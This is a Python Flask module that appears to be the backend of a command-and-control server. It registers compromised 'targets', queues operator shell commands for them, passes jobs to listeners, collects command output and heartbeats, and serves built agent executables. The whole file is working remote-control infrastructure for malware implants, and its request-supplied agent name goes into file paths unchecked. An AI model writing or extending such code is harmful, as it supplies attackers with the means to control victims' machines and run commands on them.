# TODO handle db errors
# TODO make normalized responses
# TODO make them function blueprints
if __name__ == "__main__":
    raise RuntimeError("This should not be run as a standalone")

import os
import yaml

from __main__ import app
from flask import (
    request,
    send_from_directory
)

from flask_login import (
    current_user,
    login_required,
 )

import argosdb

from config import CONFIG


def listener_login_required(func):
    """
    decorator to authenticate listener users
    use it like this @listener_login_required before a 
    function declaration.
    """
    def wrapper_func():
        api_key = request.headers.get("Authorization")
        if api_key is None:
            return {'success': False, 'msg': "No api key provided"}
        
        listener = argosdb.auth_listener(api_key)

        if listener is None:
            return {'success': False, 'msg': "Bad api key"}
        
        return func(listener=listener)
    wrapper_func.__name__ = func.__name__
    return wrapper_func


@app.route('/api/v1/build_config', methods=["GET"])
@login_required
def build_config():
    """
    Retrieve the build config of an agent from the config.yaml file.
    It gets the agent from the GET parameter "agent"
    :return dict: the current build config
    """
    agent = request.args.get("agent", "default")
    agents_dir = CONFIG['agents_path'] + "/" + agent

    config_file = os.path.join(agents_dir, "config.yaml")
    if not os.path.exists(config_file):
        return {'error': 'the config.yaml file does not exists for the specified agent name.'}
    
    with open(config_file, 'r') as stream:
        return yaml.safe_load(stream)
    

@app.route('/api/v1/build', methods=['POST'])
@login_required
def build():
    """
    Build an agent and send the binary to the client.
    post body should have the build parameters and the agent name.
    """
    agent = request.form.get("agent")
    if agent is None:
        return {'success': False, 'data': "No agent specified"}
    

    for el in request.form.items():
        print(el)

    executable = "agent.exe"
    build_path = CONFIG["agents_path"]
    agent_dir = os.path.join(build_path, agent)

    print(request.form, agent_dir)
    return send_from_directory(agent_dir, executable)


@app.route('/api/v1/agents_list', methods=["GET"])
@login_required
def agents_list():
    """
    Retrieve the list of all possible agents.
    It looks for any directory on ../agents/
    :return list: the list of agents from fs
    """
    agents_dir = CONFIG['agents_path']
    agents = [d for d in os.listdir(agents_dir) if os.path.isdir(os.path.join(agents_dir, d))]

    # put default in first
    if 'default' in agents:
        default_index = agents.index('default')
        agents = [agents[default_index]] + agents[:default_index] + agents[default_index+1:]

    return agents


@app.route('/api/v1/command_history/<target_id>', methods=["GET"])
@login_required
def command_history(target_id=-1):
    """
    Get all the commands typed by the current user on a target. Used 
    by the web client to construct the history.
    :param target_id int: the id of the target
    :return [dict]: the commands info
    """
    commands = argosdb.get_user_command_history_of_target(target_id, current_user.id)
    if commands == None:
        return {'success': False, 'msg': "No command on this target"}
    return commands


@app.route('/api/v1/send_command/<target_id>', methods=["POST"])
@login_required
def send_command(target_id=-1):
    """
    Send a new command to a target.
    Post body should be: 'cmd'=<data>
    :return str: ko/ok if it succeeded
    """
    command = request.form.get('cmd')
    if command is None:
        return {'success': False, 'msg': "No 'cmd' provided"}
    
    if argosdb.get_target_by_id(target_id) is None:
        return {'success': False, 'msg': "target_id seems incorrect"}
    
    argosdb.add_new_command(command, target_id, current_user.id)
    return {'success': True, 'msg': ""}


@app.route('/api/v1/targets', methods=["GET"])
@login_required
def targets():
    """
    Return the list of existing targets
    :return [dict]: the list of targets (see db schema for dict structure)
    """
    targets = argosdb.get_all_targets()
    return targets


# # Listener functions are not using the @login_required since listeners
# are not regular users and are identified with their unique api key
@app.route('/api/v1/new_target', methods=["POST"])
@listener_login_required
def new_target(listener=None):
    """
    When the listener gets a new connection, it hits
    this to create a new target associated with it.
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    post body should be like this: ip_addr=<ip>&display_name<ip>
    """
    uid = request.form.get('uid')
    ip_addr = request.form.get('ip_addr')
    display_name = request.form.get('display_name')
    if uid is None or ip_addr is None or display_name is None:
        return {'success': False, 'msg': 'ip_addr and display_name are required'}
    
    target_id = argosdb.add_new_target(uid, display_name, ip_addr, listener["id"])
    return {'success': True if target_id != -1 else False, 'data': {'id': target_id}}


@app.route('/api/v1/get_target', methods=["GET"])
@listener_login_required
def get_target(listener=None):
    """
    Hit this to retrieve target info from an uid passed as get param.
    :return dict: target info
    """
    uid = request.args.get('uid')
    targets = argosdb.get_all_targets()

    for target in targets:
        if target['uid'] == uid:
            return {'success': True, 'data': target}
    return {'success': False, 'data': "No target with this uid"}


@app.route('/api/v1/current_jobs', methods=["GET"])
@listener_login_required
def current_jobs(listener=None):
    """
    Retrieve all the jobs that needs to be procceded by the 
    agents.
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    :return [dict]: {'id': <int>, 'target_id': int, 'ip_addr': <str>, 'command': <str>}
    """
    commands = argosdb.get_all_active_commands_for_listener(listener['id'])
    jobs = []
    for command in commands:
        target_info = argosdb.get_target_by_id(command['executed_on'])
        jobs.append({
            'command_id': command['id'],
            'target_id': target_info['id'],
            'target_uid': target_info['uid'],
            'target_name': target_info['display_name'],
            'target_ip': target_info['ip_addr'],
            'command': command['command']
        })

    return {'success': True, 'data': jobs}


@app.route('/api/v1/heartbeat', methods=["POST"])
@listener_login_required
def heartbeat_(listener=None):
    """
    Give life signs from agent/listener.
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    body params: target_id=<int>
    """
    target_id = request.form.get('target_id')
    if target_id is None:
        return {'success': False, 'msg': 'target_id required'}

    argosdb.update_heartbeat_listener(listener['id'])
    argosdb.update_heartbeat_target(target_id)
    return {'success': True, 'msg': "updated heartbeats"}


@app.route('/api/v1/output', methods=["POST"])
@listener_login_required
def output(listener=None):
    """
    Endpoint used to provide output for a command.
    Post body should be: command_id=<id>&output=<output>
    Takes a listener as parameter that comes from the listener_login_required, that
    assures us that to have a valid listener object
    """
    command_id = request.form.get('command_id')
    output = request.form.get('output')

    if command_id is None or output is None:
        return {'success': False, 'msg': 'command_id and output required'}

    argosdb.set_command_output(command_id, output)

    target = argosdb.get_target_from_command_id(command_id)

    argosdb.update_heartbeat_listener(listener['id'])
    argosdb.update_heartbeat_target(target['id'])

    return {'success': True, 'msg': "updated command"}
